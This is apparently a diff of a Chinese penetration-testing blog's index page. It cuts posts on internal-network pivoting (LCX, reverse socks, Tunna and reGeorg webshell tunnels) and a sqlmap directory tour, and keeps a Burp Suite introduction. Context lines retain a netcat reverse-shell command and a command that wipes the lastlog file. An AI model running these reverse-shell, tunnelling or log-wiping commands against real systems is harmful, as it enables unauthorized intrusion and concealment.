@@ -75,35 +75,15 @@
 </code></pre><p>在远程机器上(t可省略)</p>
 <pre><code>nc -t -e cmd.exe 192.168.1.2 8888
 </code></pre><p>然后成功之后，本地机器上已经获得了远程机器的cmdshell</p>
-<h2 id="0x02-LCX转发"><a href="#0x02-LCX转发" class="headerlink" title="0x02 LCX转发"></a>0x02 LCX转发</h2><p>内网机器上执行</p>
-<pre><code>lcx.exe –slave 192.168.1.3 8888 192.168.1.2 3389
-</code></pre><p>将内网的3389端口转发到公网的8888端口<br>然后在公网的上监听8888端口，转发3389端口</p>
-<pre><code>Lcx.exe –listen 8888 3389
-</code></pre><p>Ok，已将内网的3389转发到了公网的3389端口，我们在本地机器上远程公网IP，就连接上了内网机器的3389</p>
-<h2 id="0x03-sSocket"><a href="#0x03-sSocket" class="headerlink" title="0x03 sSocket"></a>0x03 sSocket</h2><p>一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，就是将远程计算机作为socks代理服务端，反弹回本地，很好、很方便。</p>
-<p>先在vps监听1088端口</p>
-<pre><code>rcsocket.exe –l 1088 –p 8888 –vv,
-</code></pre><p>内网机器执行</p>
-<pre><code>./rssocks –vv –s 192.168.1.10:8888(VPS)
-</code></pre><p>成功，则会看到会话建立<br>设置代理，让本机可以通过VPS的1088端口访问内网机器<br>本机上 ssh 192.168.1.4内网主机<br>成功ssh到内网机器</p>
-<h2 id="0x04-Tunna转发"><a href="#0x04-Tunna转发" class="headerlink" title="0x04 Tunna转发"></a>0x04 Tunna转发</h2><p>上传源码包中文件夹webshell下的脚本至网站目录，然后本地进行连接上传的webshell</p>
-<pre><code>python proxy.py -u http://172.0.0.1/conn.jsp -l 8888 -r 22 -v -s
-</code></pre><p>然后在xshell中执行</p>
-<pre><code>ssh 127.0.0.1 8888
-</code></pre><p>同样的，如果内网的机器是windows，就把3389转出来</p>
-<pre><code>proxy.py -u http://127.0.0.1/conn.jsp -l 8888 -r 3389 -v
-</code></pre><p>其中几个参数的解释：<br> -l 表示本地监听的端口<br> -r 远程要转发的端口<br> -v 详细模式<br> -s 避免中断<br>另外，如果脚本传到了内网A机器上，但是想登录内网B机器，那么可以-a参数指定机器<br>将内网中192.168.1.5主机的3389转发到本地</p>
-<pre><code>./proxy.py -u http://192.x.x.x/conn.jsp -l 1234 -a 192.168.1.5 -r 3389
-</code></pre><h2 id="0x05-reGeorg-proxifier正向代理"><a href="#0x05-reGeorg-proxifier正向代理" class="headerlink" title="0x05 reGeorg+proxifier正向代理"></a>0x05 reGeorg+proxifier正向代理</h2><p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
-<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
-<p>运行</p>
-<pre><code>python reGeorgSocksProxy.py -p 8888 -u http://www.xxx.com/tunnel.php
-</code></pre><p>将proxifier打开，在Proxy Server中选择SOCKS Version5<br>然后就可以在本地访问内网的机器</p>
-
+<h2 id="0x02-LCX转发"><a href="#0x02-LCX转发" class="headerlink" title="0x02 LCX转发"></a>0x02 LCX转发</h2>
       
     </div>
     <footer>
       
+        
+          <div class="alignleft">
+            <a href="/2016/07/29/29/#more" class="more-link">Read More</a>
+          </div>
         
         
       
@@ -176,27 +156,14 @@ echo &gt; /var/log/lastlog
       
         <h2 id="Sqlmap的源码【1】目录结构"><a href="#Sqlmap的源码【1】目录结构" class="headerlink" title="Sqlmap的源码【1】目录结构"></a>Sqlmap的源码【1】目录结构</h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>sqlmap 是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。本文重点研究sqlmap的软件具体的目录结构，后续的文章也会从源码编写中，阐述sqlmap的种种编码结果。本文从结构中，可以看到sqlmap中的软件工程之美，同时从严谨的软件结构目录分类和构造中，看到sqlmap中的软件开发过程中的庞大但简洁的结构之美。</p>
 <h2 id="0x01目录结构简要"><a href="#0x01目录结构简要" class="headerlink" title="0x01目录结构简要"></a>0x01目录结构简要</h2><p>一般来说，从github下载并且解压sqlmap 后，所有文件或者文件夹的数目加起来总共24个，部分目录和结构属于典型的github 项目结构，但是本文依然会做出简单的介绍，方便读者全面理解。<br>.Git —&gt;&gt;&gt;这个是git的代码管理仓库，基本上每个github项目都会有这个文件夹，记录了文件上传更改等版本信息。<br>.gitattributes—&gt;&gt;&gt;这个是git的属性文件，例如何种编程语言、具体文件类型等。<br>.gitignore—&gt;&gt;&gt;这个是git的忽略文件，例如忽略某些文件，不把这些文件上传到git仓库中。<br>.travis.yml—&gt;&gt;&gt;这个标记了Python的版本和设置sqlmap的脚本。<br>doc/ —-&gt;&gt;&gt;该文件夹包含了sqlmap 的具体使用说明，例如多种语言的简要说明、PDF版的详细说明、FAQ、作者信息等。<br>extra/  —&gt;&gt;&gt;这里包含了sqlmap的多种额外功能，例如发出声响（beep)、运行cmd、安全执行、shellcode等。<br>lib/   —&gt;&gt;&gt;这里包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。<br>plugins/  —&gt;&gt;&gt;这里包含了各种数据库的信息和数据库通用事项。<br>procs/    —&gt;&gt;&gt; 这里包含了mssqlserver、 MySQL、oracle和postgresql的触发程序<br>shell/    —&gt;&gt;&gt;这里包含了多种注入成功后的9种shell 远程连接命令执行和管理数据库<br>tamper/       —&gt;&gt;&gt;这里包含了47种的绕过脚本，例如编码绕过、注释绕过等。<br>thirdparty/  —&gt;&gt;&gt;这里包含了一些其他第三方的插件，例如优化、保持连接、颜色等。<br>txt/        —&gt;&gt;&gt;这里包含了一些字典，例如用户浏览器代理、表、列、关键词等。<br>udf/  —&gt;&gt;&gt;这里包含了用户自己定义的攻击载荷。<br>waf/ —&gt;&gt;&gt;&gt;这里包含了一些44种常见的防火墙特征。<br>xml/ —&gt;&gt;&gt;这里包含了多种数据库的注入检测载荷、旗标信息以及其他信息。在这里可以看到进行注入的。<br>README.md—&gt;&gt;&gt;说明文件，简要地指导我们下载、安装和使用sqlmap，里面有多种语言版本(中文)的安装下载使用介绍说明。<br>sqlmap.conf  —&gt;&gt;&gt;&gt; sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测）。<br>sqlmap.py<em>  —&gt;&gt;&gt;&gt; 这是sqlmap 的主程序，可以调用各种参数进行注入任务。<br>sqlmapapi.py</em>  —&gt;&gt;&gt;&gt;  这是sqlmap 的api 文件，可以将sqlmap集成到其他平台上。</p>
-<h2 id="0x02-目录-sqlmap-doc"><a href="#0x02-目录-sqlmap-doc" class="headerlink" title="0x02 目录 sqlmap/doc/"></a>0x02 目录 sqlmap/doc/</h2><p>这里包含了sqlmap 的具体使用说明。如多种语言的简要说明、PDF版的详细说明、FAQ、作者信息等。以下是文件夹的内容：<br>README.pdf  #英文说明文档，它非常详细介绍了如何调用各种参数和设置来使用sqlmap。善于熟练利用sqlmap也是很厉害的<br>FAQ.pdf  #英文解疑文档，它罗列了在使用sqlmap经常遇到的问题和解决，无论是安装还是使用过程出现问题，可以查看帮助。<br>translations #翻译文件夹，包含了下载、安装和使用sqlmap的简要说明文档，该文件包含多种语言版本，其中也有中文版。<br>AUTHORS  #作者信息，它介绍了sqlmap的编者及其邮箱。国外的两个大牛很慷慨地开源了sqlmap注入工具，想想乌云中，有多人靠它四处挖洞，实在应该感谢编者。<br>CHANGELOG.md   #更新日志，介绍了sqlmap 的更新功能及特性。很多优秀的功能等待挖掘。但很多人没有注意，毕竟绝大部分同学用的都是基本功能。<br>CONTRIBUTING.md #贡献文件，它介绍我们在使用sqlmap的时如果有bug可以提交攻贡献到github.<br>COPYING     #版权文件，它介绍了sqlmap的发布权利和重新分发的说明。<br>THANKS.md    #感谢文档，它介绍了对sqlmap有所贡献的作者。<br>THIRD-PARTY.md #第三方插件，它介绍了集成在sqlmap的第三方插件的概要说明。</p>
-<h2 id="0x03-目录-sqlmap-extra"><a href="#0x03-目录-sqlmap-extra" class="headerlink" title="0x03 目录 sqlmap/extra/"></a>0x03 目录 sqlmap/extra/</h2><p>sqlmap/extra/beep/   #警报声音文件夹。<br>sqlmap/extra/beep/ beep.py，它是产生警报声音的文件，参数为–beep，当发现sql注入的时候，发出警报声。<br>sqlmap/extra/beep/ beep.wav 警报的声音文件。<br>sqlmap/extra/dbgtool/  # 执行转换的文件夹。<br>sqlmap/extra/dbgtool/dbgtool.py    #可以 ASCII文本转化到便携式的exe文件，生成的nc.exe可以安装windows上，进行后门监听。<br>sqlmap/extra/dbgtool/  README.txt为该文件的说明文件。<br>sqlmap/extra/mssqlsig/update.py#它更新了MSSQL版本号，不过好像URL打不开了。莫非是国内的原因。<br>sqlmap/extra/safe2bin/   #文件夹，具有转成bin文件功能的文件。例如你可以把一个文本转换成可执行文件。其README.txt有它的简要说明、safe2bin.py是可操作的执行文件。<br>sqlmap/extra/shutils/ #python的文件操作工具。它实现了查找第三方插件等功能。<br>sqlmap/extra/cloak/  #可以利用cloak.py可以生成后门等操作。<br>sqlmap/extra/icmpsh/  #一个win32的反向ICMPshell，是进行注入成功后反弹回来的一种shell.<br>sqlmap/extra/runcmd/  #进行注入成功后，反弹回来cmd命令的辅助工具.<br>sqlmap/extra/shellcodeexec/  #被安装在受害者机器上的shellcode，这些并非在自己的机器上运行的，里面有windows的32，linux的32,64位<br>sqlmap/extra/sqlharvest/  #利用google进行搜索爬取文件。</p>
-<h2 id="0x04-目录-sqlmap-lib"><a href="#0x04-目录-sqlmap-lib" class="headerlink" title="0x04 目录 sqlmap/lib"></a>0x04 目录 sqlmap/lib</h2><p>sqlmap调用多种功能的库，以下是其文件夹里面的内容：<br>controller  # 该目录能够进行一系列的检查贮备工作，下面简要介绍几个文件。<br>action.py # 利用URL受到影响的参数进行SQL注入，并且在条件许可下抽取系统或者数据库中的数据。<br>checks.py #利用载荷对对发现的sql注入点进行注入检测。<br>controller.py #对用户传递的参数进行控制。<br>handler.py #对用户传递的数据库名称进行处理<br>core     # 该核心文件夹有各种参数的调用文件。例如设置目标 会调用 target.py。还有agent.py，dump.py，threads.py等等。<br>parse   #  该参数文件夹有banner.py cmdline.py sitemap.py configfile.py payloads.py   handler.py html.py headers.py等一系列配置处理参数调用文件。<br>request  # 该请求文件夹有basic.py templates.py basicauthhandler.py redirecthandler.py comparison.py rangehandler.py connect.py pkihandler.py direct.py methodrequest.py dns.py inject.py httpshandler.py等一系列网络请求连接文件。<br>takeover  # 该接管文件夹有abstraction.py xp_cmdshell.py icmpsh.py web.py metasploit.py udf.py registry.py注入成功后接管受害者机器的shell.<br>techniques  #该注入分类文件夹有blind brute dns error union  等五类注入类型，其中每个文件夹有相应的注入类型执行文件。<br>utils  #小功能文件夹。该文件有api.py xrange.pycrawler.py versioncheck.py deps.py timeout.py getch.py hash.py sqlalchemy.py hashdb.py search.py htmlentities.py purge.py pivotdumptable.py progress.py等多种功能的调用文件。</p>
-<h2 id="0x05-sqlmap-plugins"><a href="#0x05-sqlmap-plugins" class="headerlink" title="0x05 sqlmap\plugins"></a>0x05 sqlmap\plugins</h2><p>插件说明<br>dbms #该文件夹包含了各种数据说明。例如access db2 firebird hsqldb maxdb mssqlserver mysql oracle postgresql sqlite sybase 等，每个数据库文件都有固定的文件。例如access文件夹里面有connector.py enumeration.py takeover.py filesystem.py syntax.py fingerprint.py等文件。<br>generic #通用文件夹。它也是包含了connector.py enumeration.py takeover.py filesystem.py syntax.py fingerprint.py等文件。</p>
-<h2 id="0x06-sqlmap-procs"><a href="#0x06-sqlmap-procs" class="headerlink" title="0x06 sqlmap\procs"></a>0x06 sqlmap\procs</h2><p>对部分数据库的进行注入时访问进程<br>mssqlserver #对mssqlserver 进行处理的进程进行访问，方便对数据进行访问。<br>mysql  #对mysql进行处理的进程进行访问，方便对数据进行访问。<br>oracle  #对oracle进行处理的进程进行访问，方便对数据进行访问。<br>postgresql  #对postgresql进行处理的进程进行访问，方便对数据进行访问。<br>README.txt #对该文件夹的说明。该文件sqlmap在目标系统上使用的SQL片段。</p>
-<h2 id="0x07-sqlmap-shell"><a href="#0x07-sqlmap-shell" class="headerlink" title="0x07 sqlmap\shell"></a>0x07 sqlmap\shell</h2><p>相信大家看着那些名称，也会明白它们是sqlmap成功注入系统的shell,各种语言的shell， 为了躲避查杀，需要进行一定的转换，至于如何转换在README.txt   有详细说明。/extra/cloak/cloak.py 可以把这些后门还原成可阅读的代码。<br>backdoor.asp_  backdoor.aspx<em>backdoor.jsp</em> backdoor.php<em> runcmd.exe</em>   stager.asp<em>   stager.aspx</em>  stager.jsp<em>   stager.php</em><br>README.txt    #以上shell均是加密了，直接打开是乱码的，所以可以按照说明文档进行转换。</p>
-<h2 id="0x08-sqlmap-tamper"><a href="#0x08-sqlmap-tamper" class="headerlink" title="0x08 sqlmap\tamper"></a>0x08 sqlmap\tamper</h2><p>这里有多种进行注入时绕过防火墙的脚本，33种，组合多种脚本来用，效果还是不错的。以下是具体的绕过脚本：<br>     apostrophemask.py apostrophenullencode.py appendnullbyte.py base64encode.py between.py<br>     bluecoat.py chardoubleencode.py charencode.py charunicodeencode.py commalesslimit.py commalessmid.py<br>     concat2concatws.py equaltolike.py escapequotes.py greatest.py halfversionedmorekeywordsifnull2ifisnull.py<br>     informationschemacomment.lowercase.py modsecurityversioned.py  modsecurityzeroversioned.multiplespaces.py<br>     nonrecursivereplacement.poverlongutf8.py percentage.py randomcase.py randomcomments.py securesphere.py<br>     sp_password.py space2comment.py space2dash.py space2hash.py space2morehash.py space2mssqlblank.py<br>     space2mssqlhash.py space2mysqlblank.py space2mysqldash.py space2plus.py space2randomblank.py<br>     symboliclogical.py unionalltounion.py unmagicquotes.py uppercase.py varnish.py versionedkeywords.py<br>     versionedmorekeywords.py xforwardedfor.py</p>
-<h2 id="0x09-sqlmap-thirdparty"><a href="#0x09-sqlmap-thirdparty" class="headerlink" title="0x09 sqlmap\thirdparty"></a>0x09 sqlmap\thirdparty</h2><p>第三方插件，实现各种优化格式的小功能。<br>ansistrm         #该文件夹中主要为ansistrm.py，它定义了结果输出终端的颜色显示。<br>beautifulsoup    #该文件夹中主要为beautifulsoup.py，它把XML等转化为树状表示法。<br>bottle           #bottle是Python的一个快速，简单和轻巧WSGI微Web框架。它分布作为单个文件模块，不依赖其他Python标准库。主要为bottle.py，它是构建静态和动态HTTP请求的关键所在，虽然支持python3，但是由于sqlmap整体是采用python2开发的，所以这里会进行一个兼容性检查。<br>chardet          #该文件夹中有众多字符探针和字符定义文件，主要作用是探测web页面的页面编码。<br>clientform       #该文件夹主要为clientform.py，它对Web客户端进行HTML表格处理。<br>colorama         #该文件夹的主要功能是为了将ansi转化为win32编码。<br>fcrypt           #该文件夹主要为标准的linux加密提供端口，或者说是修复缺失加密功能的python版本。<br>gprof2dot        #该文件夹提供了从几个解析器的输出中产生一个dot 图形，<br>keepalive        #该文件夹主要为keepalive.py，它的urllib2对HTTP处理程序支持HTTP1.1和存活。<br>magic            #该文件夹主要为magic.py，magic 是一个libmagic文件识别库的包装器。<br>multipart        #该文件夹主要为multipartpost.py，进行多线程发送数据包。<br>odict            #该文件夹主要为odict.py，主要为有序字典对象，保存插入顺序的密钥。<br>oset             #python ABC类的部分补丁，pyoset.py为主要程序，_abc.py为辅助类的ABC类说明。<br>pagerank         #该文件夹主要为pagerank.py，获取谷歌网页排名的页面的脚本。<br>prettyprint      #该文件夹主要为prettyprint.py，该脚本优化终端结果输出显示。<br>pydes            #python中3DES加密解密算法，其中里面有加密解密算法说明。<br>socks            #python中的sock模块。<br>termcolor        #该文件夹中主要为termcolor.py，它实现了终端输出的颜色格式化。<br>xdot             #dot格式的可视化图形。</p>
-<h2 id="0x0A-sqlmap-txt"><a href="#0x0A-sqlmap-txt" class="headerlink" title="0x0A sqlmap\txt"></a>0x0A sqlmap\txt</h2><p>该文件夹包含了关键词、公共列表和其他一些字典。具体如下：<br>common-columns.txt #数据库中的共同列。<br>common-outputs.txt  #数据库中的共同输出。<br>common-tables.txt   #数据库中的共同表。<br>keywords.txt        #数据库中的共同关键词。<br>smalldict.txt      #数据库中的字典。<br>user-agents.txt     #进行请求时的浏览器代理头。</p>
-<h2 id="0x0B-sqlmap-udf"><a href="#0x0B-sqlmap-udf" class="headerlink" title="0x0B sqlmap\udf"></a>0x0B sqlmap\udf</h2><p>以下的文件在受害者机器上运行的数据代码，而不是在我们攻击者的及其上执行的。<br>mysql #包括linux和windows的lib_mysqludf<em>sys.dll</em>，均有32位和64位。<br>postgresql #包括linux和windows的lib_mysqludf<em>sys.dll</em>，均有32位和64位。<br>README.txt #该文件夹的功能说明。</p>
-<h2 id="0x0C-sqlmap-waf"><a href="#0x0C-sqlmap-waf" class="headerlink" title="0x0C sqlmap\waf"></a>0x0C sqlmap\waf</h2><p>该文件夹有44个脚本分别对44种WAF进行检测。例如360，绿盟WAF，modsecurity.，百度，fortiweb，cloudflare。由此可见老外对国内的WAF也是有了解的，可见他们也会悄悄对国内的WAF进行绕过。具体WAF探测如下：<br>360.py airlock.py anquanbao.pybaidu.py barracuda.pybigip.py binarysec.pyblockdos.py ciscoacexml.py cloudflare.py datapower.py<br>denyall.py dotdefender.py edgecast.py expressionengine.py fortiweb.py hyperguard.py incapsula.py isaserver.py<br>jiasule.py knownsec.py kona.py modsecurity.py netcontinuum.py netscaler.py newdefend.py nsfocus.py paloalto.py<br>profense.py proventia.py radware.py requestvalidationmode.py safe3.py safedog.py secureiis.py senginx.py<br>sucuri.py teros.py trafficshield.py urlscan.py uspses.py varnish.py webappsecure.py webknight.py             </p>
-<h2 id="0x0D-sqlmap-xml"><a href="#0x0D-sqlmap-xml" class="headerlink" title="0x0D sqlmap\xml"></a>0x0D sqlmap\xml</h2><p>各种信息的xml记录<br>banner # 各种数据及其相关数据的标志XML记录。例如：cookie.xml           generic.xml          mssql.xml            mysql.xml           oracle.xml           postgresql.xml    server.xml           servlet.xml          sharepoint.xml       x-aspnet-version.xml x-powered-by.xml<br>payloads #布尔、错误、内联查询、堆查询、延时盲注、联合查询等六种注入类型的攻击注入检测载荷。这点很重要，sqlmap是否能够检测到注入点，就靠这个载荷了。<br>boundaries.xml #边界记录文件。<br>errors.xml #错误显示的xml文件。<br>livetests.xml #测试存活的xml记录文件。<br>queries.xml #查询记录的xml文件。<br>sqlmap.xsd #sqlmap的 XSD是指XML结构定义 ( XML Schemas Definition ) 。</p>
-<h2 id="0x0E-README-md"><a href="#0x0E-README-md" class="headerlink" title="0x0E README.md"></a>0x0E README.md</h2><p>这个是一个说明文件，简要地指导我们下载、安装和使用sqlmap，该文件包含多种语言版本的安装下载使用介绍说明，也是很有用的一个帮助文件。在这里，你可以找到简要的中文说明！！！</p>
-<h2 id="0x0F-sqlmap-conf"><a href="#0x0F-sqlmap-conf" class="headerlink" title="0x0F sqlmap.conf"></a>0x0F sqlmap.conf</h2><p>这是sqlmap的配置文件，例如各种默认参数（默认是没有设置参数、可以设置默认参数进行批量或者自动化检测）</p>
-<h2 id="0x10sqlmapapi-py"><a href="#0x10sqlmapapi-py" class="headerlink" title="0x10sqlmapapi.py"></a>0x10sqlmapapi.py</h2><p>接口文件，可以将sqlmap集成到其他平台上。如 burp</p>
-<h2 id="0x11-sqlmap-py"><a href="#0x11-sqlmap-py" class="headerlink" title="0x11 sqlmap.py"></a>0x11 sqlmap.py</h2><p>sqlmap 的主程序，里面可以进行调用各种参数和在终端显示各种帮助信息。</p>
-
       
     </div>
     <footer>
       
+        
+          <div class="alignleft">
+            <a href="/2016/07/28/27/#more" class="more-link">Read More</a>
+          </div>
         
         
       
@@ -226,13 +193,14 @@ echo &gt; /var/log/lastlog
       
         <h3 id="Burp-Suite是Web应用程序测试的最佳工具之一，（说是收费，不过在祖国这么好的国家里，什么都可以免费）其多种功能可以帮我们执行各种任务-请求的拦截和修改-以暴力破解登陆表单，基于java，所以首先得安装java环境。我也是用到什么功能就上网查查。"><a href="#Burp-Suite是Web应用程序测试的最佳工具之一，（说是收费，不过在祖国这么好的国家里，什么都可以免费）其多种功能可以帮我们执行各种任务-请求的拦截和修改-以暴力破解登陆表单，基于java，所以首先得安装java环境。我也是用到什么功能就上网查查。" class="headerlink" title="Burp Suite是Web应用程序测试的最佳工具之一，（说是收费，不过在祖国这么好的国家里，什么都可以免费）其多种功能可以帮我们执行各种任务.请求的拦截和修改,以暴力破解登陆表单，基于java，所以首先得安装java环境。我也是用到什么功能就上网查查。"></a>Burp Suite是Web应用程序测试的最佳工具之一，（说是收费，不过在祖国这么好的国家里，什么都可以免费）其多种功能可以帮我们执行各种任务.请求的拦截和修改,以暴力破解登陆表单，基于java，所以首先得安装java环境。我也是用到什么功能就上网查查。</h3><h3 id="1-代理–Burp-Suite带有一个代理-通过默认端口8080上运行，使用这个代理，我们可以截获并修改从客户端到web应用程序的数据包"><a href="#1-代理–Burp-Suite带有一个代理-通过默认端口8080上运行，使用这个代理，我们可以截获并修改从客户端到web应用程序的数据包" class="headerlink" title="1.代理–Burp Suite带有一个代理,通过默认端口8080上运行，使用这个代理，我们可以截获并修改从客户端到web应用程序的数据包."></a>1.代理–Burp Suite带有一个代理,通过默认端口8080上运行，使用这个代理，我们可以截获并修改从客户端到web应用程序的数据包.</h3><h3 id="2-Spider-蜘蛛-–Burp-Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等，它会自动提交登陆表单（通过用户自定义输入）的情况下-Burp-Suite的蜘蛛可以爬行扫描出网站上所有的链接-通过对这些链接的详细扫描来发现Web应用程序的漏洞-。"><a href="#2-Spider-蜘蛛-–Burp-Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等，它会自动提交登陆表单（通过用户自定义输入）的情况下-Burp-Suite的蜘蛛可以爬行扫描出网站上所有的链接-通过对这些链接的详细扫描来发现Web应用程序的漏洞-。" class="headerlink" title="2.Spider(蜘蛛)–Burp Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等，它会自动提交登陆表单（通过用户自定义输入）的情况下.Burp Suite的蜘蛛可以爬行扫描出网站上所有的链接,通过对这些链接的详细扫描来发现Web应用程序的漏洞 。"></a>2.Spider(蜘蛛)–Burp Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等，它会自动提交登陆表单（通过用户自定义输入）的情况下.Burp Suite的蜘蛛可以爬行扫描出网站上所有的链接,通过对这些链接的详细扫描来发现Web应用程序的漏洞 。</h3><h3 id="3-Scanner-扫描器-–它是用来扫描Web应用程序漏洞的-在测试的过程中可能会出现一些误报。重要的是要记住-自动扫描器扫描的结果不可能完全100-准确"><a href="#3-Scanner-扫描器-–它是用来扫描Web应用程序漏洞的-在测试的过程中可能会出现一些误报。重要的是要记住-自动扫描器扫描的结果不可能完全100-准确" class="headerlink" title="3.Scanner(扫描器)–它是用来扫描Web应用程序漏洞的.在测试的过程中可能会出现一些误报。重要的是要记住,自动扫描器扫描的结果不可能完全100%准确."></a>3.Scanner(扫描器)–它是用来扫描Web应用程序漏洞的.在测试的过程中可能会出现一些误报。重要的是要记住,自动扫描器扫描的结果不可能完全100%准确.</h3><h3 id="4-Intruder-入侵-–此功能呢可用语多种用途-如利用漏洞-Web应用程序模糊测试-进行暴力猜解等"><a href="#4-Intruder-入侵-–此功能呢可用语多种用途-如利用漏洞-Web应用程序模糊测试-进行暴力猜解等" class="headerlink" title="4.Intruder(入侵)–此功能呢可用语多种用途,如利用漏洞,Web应用程序模糊测试,进行暴力猜解等."></a>4.Intruder(入侵)–此功能呢可用语多种用途,如利用漏洞,Web应用程序模糊测试,进行暴力猜解等.</h3><h3 id="5-Repeater-中继器-–此功能用于根据不同的情况修改和发送相同的请求次数并分析"><a href="#5-Repeater-中继器-–此功能用于根据不同的情况修改和发送相同的请求次数并分析" class="headerlink" title="5.Repeater(中继器)–此功能用于根据不同的情况修改和发送相同的请求次数并分析."></a>5.Repeater(中继器)–此功能用于根据不同的情况修改和发送相同的请求次数并分析.</h3><h3 id="6-Sequencer–此功能主要用来检查Web应用程序提供的会话令牌的随机性-并执行各种测试"><a href="#6-Sequencer–此功能主要用来检查Web应用程序提供的会话令牌的随机性-并执行各种测试" class="headerlink" title="6.Sequencer–此功能主要用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试."></a>6.Sequencer–此功能主要用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试.</h3><h3 id="7-Decoder-解码-–此功能可用于解码数据找回原来的数据形式-或者进行编码和加密数据"><a href="#7-Decoder-解码-–此功能可用于解码数据找回原来的数据形式-或者进行编码和加密数据" class="headerlink" title="7.Decoder(解码)–此功能可用于解码数据找回原来的数据形式,或者进行编码和加密数据."></a>7.Decoder(解码)–此功能可用于解码数据找回原来的数据形式,或者进行编码和加密数据.</h3><h3 id="8-Comparer–此功能用来执行任意的两个请求-响应或任何其它形式的数据之间的比较"><a href="#8-Comparer–此功能用来执行任意的两个请求-响应或任何其它形式的数据之间的比较" class="headerlink" title="8.Comparer–此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较"></a>8.Comparer–此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较</h3><h2 id="1、Proxy-代理"><a href="#1、Proxy-代理" class="headerlink" title="1、Proxy(代理)"></a>1、Proxy(代理)</h2><p>代理功能使我们能够截获并修改请求.为了拦截请求,并对其进行操作，我们必须通过Burp Suite配置我们的浏览器.浏览器上设置好之后，就打开Burp Suite，在Proxy项进行Intercept,需要确保intercept is on.<br>打开alerts标签,可以看到代理正运行在8080端口.我们可以在Proxy–&gt;options下来修改这个配置.<br>打开Proxy下的options标签，这里我们可以编辑代理正在监听的端口,甚至添加一个新的代理监听.Burp也有向SSL保护网站提交证书的选项.默认情况下，Burp创建一个自签名的证书之后立即安装.”generate CA-signed per-host certificates”选项选中之后Burp的证书功能将生成一个我们能够链接的证书签署的特定主机.在这里我们关心的唯一事情是，当一个用户链接到一个SSL保护的网站时，能后减少网站警告提示的次数.<br>如果我们不选中”listen on loopback interface only”选项，意味着Burp Proxy可以作为一个网络上其它系统的代理。这意味着在同一网络中的任何计算机都可以使用Burp Proxy功能成为代理,并中继通过它的流量.<br>“support invisible proxying for non-proxy-aware client”选项是用于客户端不知道他们使用的是代理的情况下.这意味着代理设置不是设置在浏览器，有时候设置在hosts文件中.在这种情况下，和将代理选项设置在浏览器本身所不同的是Burp需要知道它是从一个非代理客户端接收流量的.”redirect to host”和”redirect to port”选项将客户端重定向到我们在该选项后设置的主机和端口。<br>同样,我们可以拦截请求，并根据我们指定的规则返回响应.<br>这里有个选项用来修改从响应中接收到的html网页。我们可以取消隐藏的表单字段,删除javascript等。还有一个选项用自定义字符串替换掉寻找到的特定的模式.我们需要用指定正则表达式。Burp将解析请求或者响应以期望能够寻找到这种模式,将会用自定义的字符串来替换它.</p>
 <h2 id="2、Spider-抓取"><a href="#2、Spider-抓取" class="headerlink" title="2、Spider(抓取)"></a>2、Spider(抓取)</h2><p>Burp Spider用来映射Web应用程序.它会自动抓去Web应用程序的链接,提交它发现的所有登陆表单,从而详细的分析整个应用程序.这些链接会传递给Burp Scanner,进行详细的扫描.在这种情况下,我们将使用上DVWA(Damn Vulnerable Web Application).只是需要DVMA使用你的浏览器，确保Burp Suite上的inerrcept is on,并且得到Brup截取的请求,右键单击拦截的请求，选择”Send to Spider”发送给蜘蛛.<br>接下来会弹出一个警告弹窗让我们”add item to scope(添加项目到作用域)”.点击”Yes”.一个范围将在我们运行的测试目标上定义好.<br>我们能够在site map–&gt;target标签看到一个url已经添加进作用域.我们也能看到一些其它的目标已经在目标列表中添加好了.Burp会自动使用代理浏览我们定义好的目标网页.我们可以使用单击右键–&gt;”add item to scope(添加项目到作用域)”添加任何项目到我们的作用域.<br>进入Scope标签,我们能够看到DVWA应用已经添加到作用域.<br>接下来我们进入Spider标签,点击”options(选项)”,我们可以设置各种选项当运行Burp检测应用程序的时候.我没有可以让Burp检查robotx.txt文件(check for the robots.txt)，它会尝试抓去网站管理员不允许搜索引擎索引的目录.另外一个重要的选项是”passively spider as you browse(被动蜘蛛浏览)”。基本上Burp Spider可以以被动和主动模式运行,选择这个就要求Burp Spider保持新的内容和链接进行扫描,因为我们浏览应用程序的时候使用了Burp proxy。<br>另外一个重要的选项是”application login(应用程序登陆)”.一旦Burp Spider提交一个登陆表单的时候就开始爬行(抓取).它可以自动提交我们提供给它的证书.我们同样可以设置admin/password凭证,设置好之后,他们会做为DVWA中的凭证.因此Burp Spider可以自动提交那些信息凭证,并且保持爬行抓取的状态希望能够获得更多的新的信息.你也可以在thread(线程)项来修改线程数.<br>需要开始爬行抓去Web应用程序,只需要右键点击目标展开目标.然后在展开的dvwa项上单击鼠标右键选择”Spider this brach”<br>这样就会启动Burp Spider，在Spider control标签下我们会看到正在做出的请求,我们也可以为Burp Spider自定义一个范围.<br>一旦运行完成之后，我们在dvwa分支上会看到很多新的URL,这些URL为我们提供了很多有关Web信用程序的信息.然后我们就可以发送这些链接给Burp Scanner来进行漏洞扫描.Burp Scanner只有在专业版上才有这个功能.</p>
